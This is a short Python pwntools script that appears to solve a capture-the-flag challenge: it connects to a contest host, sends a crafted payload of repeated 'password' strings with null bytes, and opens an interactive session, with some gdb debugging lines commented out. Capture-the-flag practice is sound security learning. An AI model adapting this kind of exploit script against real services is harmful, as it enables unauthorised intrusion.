from pwn import *

conn = remote('challs.wreckctf.com', 31009)
conn.recvline()

payload = cyclic(0)
payload += b'passwor\x00'
payload += b'password'
payload += b'passwor\x00'
payload += b'password'
payload += b'password'
    
# payload += cyclic(30)

# add null terminator
# payload += b'\x00'
# payload += b'helloworld'
# payload += b'\x00'

# p = gdb.debug(["./challenge"], '''
#     unset env LINES
#     unset env COLUMNS
#     break main
#     ''')

# p.sendline(payload)
# p.interactive()


conn.sendline(payload)
conn.interactive()